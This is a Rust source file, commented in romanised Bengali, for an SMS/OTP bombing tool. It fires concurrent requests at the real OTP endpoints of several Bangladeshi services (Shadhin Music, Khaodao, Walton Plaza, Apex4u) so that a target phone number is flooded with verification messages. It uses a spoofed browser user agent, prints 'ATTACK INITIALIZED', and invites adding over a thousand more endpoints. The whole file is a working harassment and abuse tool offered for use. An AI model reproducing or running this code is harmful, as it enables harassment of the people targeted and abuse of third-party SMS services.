use reqwest::{Client, header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT}};
use serde_json::{json, Value};
use std::time::Duration;
use futures::future::join_all;

// 1. API Structure (Apni jate shohoje add korte paren)
struct SmsApi {
    name: &'static str,
    url: &'static str,
    method: &'static str,
    body_builder: fn(&str) -> Value,
}

#[tokio::main]
async fn main() {
    let target_number = "017XXXXXXXX"; // Target Number ekhane hobe
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .unwrap();

    // 2. Apnar dewa API gulo ekhane array-te thakbe (1000+ add kora jabe)
    let apis = vec![
        SmsApi {
            name: "Shadhin Music",
            url: "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
            method: "POST",
            body_builder: |p| json!({"msisdn": format!("880{}", &p[1..]), "shortcode": 16235, "servicename": "Shadhin Music"}),
        },
        SmsApi {
            name: "Khaodao",
            url: "https://api.eat-z.com/auth/customer/app-connect",
            method: "POST",
            body_builder: |p| json!({"username": format!("+88{}", &p[1..])}),
        },
        SmsApi {
            name: "Walton Plaza",
            url: "https://waltonplaza.com.bd/api/auth/otp/create",
            method: "POST",
            body_builder: |p| json!({"auth": {"countryCode": "880", "phone": &p[1..]}, "captchaToken": "recapcha"}),
        },
        SmsApi {
            name: "Apex4u",
            url: "https://api.apex4u.com/api/auth/login",
            method: "POST",
            body_builder: |p| json!({"phoneNumber": p}),
        },
        // --> Ekhave apni niche 1000 ti API add korte parben
    ];

    println!("🚀 [SYSTEM] ATTACK INITIALIZED ON: {}", target_number);

    // 3. Ultra Fast Concurrent Execution
    let mut tasks = vec![];

    for api in apis {
        let client_ref = client.clone();
        let number = target_number.to_string();

        let task = tokio::spawn(async move {
            let body = (api.body_builder)(&number);
            let mut headers = HeaderMap::new();
            headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
            headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"));

            let response = if api.method == "POST" {
                client_ref.post(api.url).headers(headers).json(&body).send().await
            } else {
                client_ref.get(api.url).headers(headers).send().await
            };

            match response {
                Ok(res) => println!("[{}] STATUS: {}", api.name, res.status()),
                Err(_) => println!("[{}] FAILED", api.name),
            }
        });
        tasks.push(task);
    }

    // Sob gulo request eksathe run hobe (No waiting)
    join_all(tasks).await;
    println!("✅ [SYSTEM] ALL THREADS EXECUTED.");
}
